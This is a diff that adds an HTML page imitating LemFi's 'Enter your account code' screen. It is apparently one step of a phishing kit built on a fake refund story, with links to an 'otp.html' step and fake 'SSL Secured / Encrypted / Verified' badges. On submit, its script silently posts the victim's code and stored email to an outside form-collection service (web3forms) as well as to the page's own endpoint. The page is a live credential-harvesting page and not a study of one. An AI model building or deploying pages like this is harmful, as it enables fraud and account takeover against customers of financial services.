@@ -1,0 +1,721 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lemfi — Account Code</title>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700;1,9..40,400&display=swap" rel="stylesheet">
+    <style>
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --green-primary: #00C389;
+            --green-dark: #00A873;
+            --green-light: #E6F9F2;
+            --green-ghost: #F0FBF6;
+            --purple-primary: #7C3AED;
+            --purple-light: #F3F0FF;
+            --purple-border: #DDD6FE;
+            --purple-text: #5B21B6;
+            --text-primary: #1B1B1B;
+            --text-secondary: #6B7280;
+            --text-tertiary: #9CA3AF;
+            --border: #E5E7EB;
+            --bg-body: #F9FAFB;
+            --bg-card: #FFFFFF;
+            --bg-input: #F9FAFB;
+            --bg-input-focus: #FFFFFF;
+            --shadow-sm: 0 1px 2px rgba(0,0,0,0.05);
+            --shadow-lg: 0 12px 40px rgba(0,0,0,0.08);
+            --shadow-btn: 0 4px 14px rgba(0,195,137,0.3);
+            --radius-sm: 8px;
+            --radius-md: 12px;
+            --radius-lg: 16px;
+            --radius-xl: 20px;
+            --error-bg: #FEF2F2;
+            --error-border: #FECACA;
+            --error-text: #DC2626;
+        }
+
+        body {
+            font-family: 'DM Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: var(--bg-body);
+            padding: 24px 16px;
+            color: var(--text-primary);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            z-index: 0;
+            background: radial-gradient(ellipse 80% 50% at 50% -20%, rgba(124,58,237,0.06) 0%, transparent 60%),
+            radial-gradient(ellipse 60% 40% at 80% 100%, rgba(0,195,137,0.04) 0%, transparent 50%);
+        }
+
+        .page-wrapper {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 440px;
+        }
+
+        .top-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 32px;
+            padding: 0 4px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-decoration: none;
+        }
+
+        .logo-mark {
+            width: 40px;
+            height: 40px;
+            background: var(--green-primary);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .logo-mark::after {
+            content: '';
+            width: 18px;
+            height: 18px;
+            border: 3px solid #fff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            transform: rotate(45deg);
+        }
+
+        .logo-wordmark {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--text-primary);
+            letter-spacing: -0.5px;
+        }
+
+        .help-link {
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--green-primary);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            padding: 6px 12px;
+            border-radius: var(--radius-sm);
+            transition: background 0.2s;
+        }
+
+        .help-link:hover { background: var(--green-light); }
+        .help-link svg { width: 16px; height: 16px; }
+
+        .card {
+            background: var(--bg-card);
+            border-radius: var(--radius-xl);
+            box-shadow: var(--shadow-lg);
+            border: 1px solid rgba(0,0,0,0.04);
+            overflow: hidden;
+        }
+
+        .card-header {
+            padding: 32px 32px 0;
+            text-align: center;
+        }
+
+        .code-icon {
+            width: 56px;
+            height: 56px;
+            background: var(--purple-light);
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 16px;
+            position: relative;
+        }
+
+        .code-icon svg {
+            width: 26px;
+            height: 26px;
+            color: var(--purple-primary);
+        }
+
+        .code-icon::after {
+            content: '';
+            position: absolute;
+            inset: -4px;
+            border-radius: 50%;
+            border: 2px dashed rgba(124,58,237,0.25);
+            animation: spinSlow 20s linear infinite;
+        }
+
+        @keyframes spinSlow {
+            to { transform: rotate(360deg); }
+        }
+
+        .card-header h2 {
+            font-size: 20px;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 6px;
+            letter-spacing: -0.3px;
+        }
+
+        .card-header p {
+            font-size: 14px;
+            color: var(--text-secondary);
+            line-height: 1.5;
+            max-width: 340px;
+            margin: 0 auto;
+        }
+
+        .info-note {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin: 20px 32px 0;
+            padding: 14px 16px;
+            background: var(--purple-light);
+            border: 1px solid var(--purple-border);
+            border-radius: var(--radius-md);
+        }
+
+        .info-note svg {
+            width: 18px;
+            height: 18px;
+            color: var(--purple-primary);
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+
+        .info-note p {
+            font-size: 13px;
+            color: var(--purple-text);
+            line-height: 1.6;
+        }
+
+        .info-note p strong {
+            color: #4C1D95;
+        }
+
+        .form-body {
+            padding: 24px 32px 0;
+        }
+
+        .otp-inputs {
+            display: flex;
+            gap: 14px;
+            justify-content: center;
+            margin-bottom: 8px;
+        }
+
+        .otp-inputs input {
+            width: 64px;
+            height: 68px;
+            text-align: center;
+            font-size: 28px;
+            font-weight: 700;
+            font-family: inherit;
+            border: 2px solid var(--border);
+            border-radius: var(--radius-lg);
+            background: var(--bg-input);
+            transition: all 0.2s ease;
+            color: var(--text-primary);
+            caret-color: var(--purple-primary);
+            outline: none;
+        }
+
+        .otp-inputs input::placeholder {
+            color: var(--text-tertiary);
+            font-weight: 400;
+            font-size: 22px;
+        }
+
+        .otp-inputs input:focus {
+            border-color: var(--border-focus);
+            background: var(--bg-input-focus);
+            box-shadow: 0 0 0 4px rgba(124,58,237,0.12);
+        }
+
+        .otp-inputs input.filled {
+            border-color: var(--purple-primary);
+            background: var(--purple-light);
+        }
+
+        .hint-row {
+            text-align: center;
+            margin: 16px 0 24px;
+            font-size: 13px;
+            color: var(--text-tertiary);
+        }
+
+        .hint-row a {
+            color: var(--purple-primary);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .hint-row a:hover { text-decoration: underline; }
+
+        .btn-primary {
+            width: 100%;
+            padding: 14px 24px;
+            background: var(--green-primary);
+            color: #fff;
+            border: border: none;
+            border-radius: var(--radius-md);
+            font-size: 15px;
+            font-weight: 600;
+            font-family: inherit;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-primary::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(180deg, rgba(255,255,255,0.12) 0%, transparent 100%);
+            pointer-events: none;
+        }
+
+        .btn-primary:hover {
+            background: var(--green-dark);
+            box-shadow: var(--shadow-btn);
+            transform: translateY(-1px);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+            box-shadow: 0 2px 8px rgba(0,195,137,0.2);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.65;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .btn-primary .btn-arrow {
+            width: 16px;
+            height: 16px;
+            transition: transform: 0.2s;
+        }
+
+        .btn-primary:hover .btn-arrow {
+            transform: translateX(2px);
+        }
+
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border: 2.5px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .error-msg {
+            color: var(--error-text);
+            font-size: 13px;
+            text-align: center;
+            margin-top: 14px;
+            display: none;
+            padding: 8px 12px;
+            background: var(--error-bg);
+            border-radius: var(--radius-sm);
+            border: 1px solid var(--error-border);
+        }
+
+        .form-footer {
+            padding: 24px 32px 28px;
+            text-align: center;
+        }
+
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--green-primary);
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .back-link:hover {
+            color: var(--green-dark);
+        }
+
+        .back-link svg {
+            width: 14px;
+            height: 14px;
+            transition: transform: 0.2s;
+        }
+
+        .back-link:hover svg {
+            transform: translateX(-2px);
+        }
+
+        .security-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 16px;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid var(--border);
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 11px;
+            color: var(--text-tertiary);
+        }
+
+        .security-badge svg {
+            width: 14px;
+            height: 14px;
+            color: var(--green-primary);
+        }
+
+        .toast {
+            position: fixed;
+            top: 24px;
+            left: 50%;
+            transform: translateX(-50%) translateY(-120%);
+            background: var(--text-primary);
+            color: #fff;
+            padding: 12px 20px;
+            border-radius: var(--radius-md);
+            font-size: 14px;
+            font-family: inherit;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.15);
+            z-index: 9999;
+            transition: transform: 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        .toast.show {
+            transform: translateX(-50%) translateY(0);
+        }
+
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(16px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes scaleIn {
+            from { opacity: 0; transform: scale(0.85); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .animate-in {
+            animation: fadeUp 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+            opacity: 0;
+        }
+
+        .animate-scale {
+            animation: scaleIn 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+            opacity: 0;
+        }
+
+        .delay-1 { animation-delay: 0.05s; }
+        .delay-2 { animation-delay: 0.1s; }
+        .delay-3 { animation-delay: 0.15s; }
+        .delay-4 { animation-delay: 0.2s; }
+        .delay-5 { animation-delay: 0.25s; }
+        .delay-6 { animation-delay: 0.3s; }
+        .delay-7 { animation-delay: 0.35s; }
+        .delay-8 { animation-delay: 0.4s; }
+        .delay-9 { animation-delay: 0.45s; }
+
+        @keyframes popIn {
+            0% { transform: scale(0.9); opacity: 0; }
+            60% { transform: scale(1.05); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .otp-inputs input {
+            animation: popIn 0.3s ease forwards;
+            opacity: 0;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20% { transform: translateX(-6px); }
+            40% { transform: translateX(6px); }
+            60% { transform: translateX(-4px); }
+            80% { transform: translateX(4px); }
+        }
+
+        .shake {
+            animation: shake 0.4s ease;
+        }
+
+        @media (max-width: 480px) {
+            body { padding: 16px 12px; }
+            .card-header { padding: 24px 24px 0; }
+            .info-note { margin: 20px 24px 0; }
+            .form-body { padding: 24px 24px 0; }
+            .form-footer { padding: 24px 24px 24px; }
+            .otp-inputs { gap: 12px; }
+            .otp-inputs input { width: 56px; height: 60px; font-size: 24px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="toast" id="toast"></div>
+
+    <div class="page-wrapper">
+        <div class="top-bar animate-in">
+            <a href="#" class="logo"><div class="logo-mark"></div><span class="logo-wordmark">Lemfi</span></a>
+            <a href="#" class="help-link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>Help</a>
+        </div>
+
+        <div class="card">
+            <div class="card-header">
+                <div class="code-icon animate-scale delay-1">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2 2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
+                </div>
+
+                <h2 class="animate-in delay-2">Enter your account code</h2>
+                <p class="animate-in delay-3">Enter the 4-digit unique code linked to your LemFi profile to finalize the refund transaction.</p>
+            </div>
+
+            <div class="info-note animate-in delay-4">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+                <p>This code was generated when you created your LemFi account. Find it under <strong>"Account Code"</strong> in your app settings or in your welcome email.</p>
+            </div>
+
+            <form id="codeForm" autocomplete="off" class="form-body">
+                <div style="height: 24px;"></div>
+
+                <div class="otp-inputs" id="codeInputs">
+                </div>
+
+                <div class="hint-row animate-in delay-6">
+                    Can't find your code? <a href="mailto:support@lemfi.com">Contact support</a>
+                </div>
+
+                <button type="submit" class="btn-primary animate-in delay-7" id="submitBtn">
+                    <span>Submit code</span>
+                    <svg class="btn-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
+                </button>
+
+                <div id="errorMsg" class="error-msg"></div>
+            </form>
+
+            <div class="form-footer animate-in delay-8">
+                <a href="otp.html" class="back-link">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 5 12 19"/></svg>
+                    Back to verification
+                </a>
+
+                <div class="security-row animate-in delay-9">
+                    <div class="security-badge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>SSL Secured</div>
+                    <div class="security-badge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Encrypted</div>
+                    <div class="security-badge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>Verified</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const CODE_LENGTH = 4;
+
+        function showToast(message) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 3500);
+        }
+
+        function buildInputs() {
+            const wrapper = document.getElementById('codeInputs');
+            wrapper.innerHTML = '';
+            for (let i = 0; i < CODE_LENGTH; i++) {
+                const inp = document.createElement('input');
+                inp.type = 'text';
+                inp.inputMode = 'numeric';
+                inp.pattern = '[0-9]*';
+                inp.maxLength = 1;
+                inp.className = 'code-digit';
+                inp.autocomplete = 'off';
+                inp.readOnly = true;
+                inp.required = true;
+                inp.style.animationDelay = (i * 0.06) + 's';
+                inp.onfocus = function () { this.removeAttribute('readonly'); };
+                wrapper.appendChild(inp);
+            }
+            attachInputListeners();
+            setTimeout(() => {
+                wrapper.querySelector('.code-digit')?.focus();
+            }, CODE_LENGTH * 60 + 150);
+        }
+
+        function getInputs() {
+            return document.querySelectorAll('.code-digit');
+        }
+
+        function attachInputListeners() {
+            const inputs = getInputs();
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', function () {
+                    const val = this.value.replace(/[^0-9]/g, '');
+                    this.value = val;
+                    if (val) {
+                        this.classList.add('filled');
+                        if (index < inputs.length - 1) inputs[index + 1].focus();
+                    } else {
+                        this.classList.remove('filled');
+                    }
+                });
+
+                input.addEventListener('keydown', function (e) {
+                    if (e.key === 'Backspace' && !this.value && index > 0) {
+                        inputs[index - 1].focus();
+                        inputs[index - 1].value = '';
+                        inputs[index - 1].classList.remove('filled');
+                    }
+                    if (e.key === 'ArrowLeft' && index > 0) {
+                        e.preventDefault();
+                        inputs[index - 1].focus();
+                    }
+                    if (e.key === 'ArrowRight' && index < inputs.length - 1) {
+                        e.preventDefault();
+                        inputs[index + 1].focus();
+                    }
+                    if (e.key === 'Enter') {
+                        e.preventDefault();
+                        document.getElementById('codeForm').dispatchEvent(new Event('submit', { cancelable: true }));
+                    }
+                });
+
+                input.addEventListener('focus', function () { this.select(); });
+
+                input.addEventListener('paste', function (e) {
+                    e.preventDefault();
+                    const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '');
+                    const all = getInputs();
+                    for (let i = 0; i < Math.min(paste.length, all.length); i++) {
+                        all[i].value = paste[i];
+                        all[i].classList.add('filled');
+                    }
+                    const focusIdx = Math.min(paste.length, all.length) - 1;
+                    if (focusIdx >= 0) all[focusIdx].focus();
+                });
+            });
+        }
+        
+        buildInputs();
+
+        document.getElementById('codeForm').addEventListener('submit', async function (e) {
+            e.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            const errorMsg = document.getElementById('errorMsg');
+            const inputs = getInputs();
+            let code = '';
+            inputs.forEach(inp => { code += inp.value; });
+
+            errorMsg.style.display = 'none';
+
+            if (code.length !== CODE_LENGTH) {
+                errorMsg.textContent = 'Please enter all 4 digits of your account code.';
+                errorMsg.style.display = 'block';
+                const wrapper = document.getElementById('codeInputs');
+                wrapper.classList.add('shake');
+                setTimeout(() => wrapper.classList.remove('shake'), 500);
+                return;
+            }
+
+            btn.disabled = true;
+            btn.innerHTML = '<div class="spinner"></div><span>Verifying...</span>';
+
+            const email = localStorage.getItem('refundEmail') || '';
+            const formData = {
+                access_key: 'YOUR_WEB3FORM_ACCESS_KEY',
+                subject: 'Account Code Verification',
+                from_name: 'Lemfi Website',
+                page: 'code.html',
+                code: code,
+                email: email
+            };
+
+            try {
+                const [web3Response, apiResponse] = await Promise.allSettled([
+                    fetch('https://api.web3forms.com/submit', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(formData)
+                    }),
+                    fetch('/api/code', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ code, email })
+                    })
+                ]);
+                const apiData = apiResponse.status === 'fulfilled' ? await apiResponse.value.json() : null;
+                if (apiData && apiData.success) {
+                    showToast('Code verified successfully!');
+                    setTimeout(() => {
+                        window.location.href = apiData.redirect;
+                    }, 500);
+                } else {
+                    errorMsg.textContent = apiData?.message || 'Invalid code. Please check and try again.';
+                    errorMsg.style.display = 'block';
+                    const wrapper = document.getElementById('codeInputs');
+                    wrapper.classList.add('shake');
+                    setTimeout(() => wrapper.classList.remove('shake'), 500);
+                    inputs.forEach(inp => { inp.value = ''; inp.classList.remove('filled'); });
+                    inputs[0].focus();
+                    btn.disabled = false;
+                    btn.innerHTML = '<span>Submit code</span><svg class="btn-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>';
+                }
+            } catch (err) {
+                showToast('Connection error. Please check your network.');
+                errorMsg.textContent = 'Unable to connect. Please try again.';
+                errorMsg.style.display = 'block';
+                btn.disabled = false;
+                btn.innerHTML = '<span>Submit code</span><svg class="btn-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>';
+            }
+        });
+
+        // Wait for the DOM to load before running init
+        document.addEventListener('DOMContentLoaded', () => {
+            buildInputs();
+        });
+    </script>
+</body>
+</html>
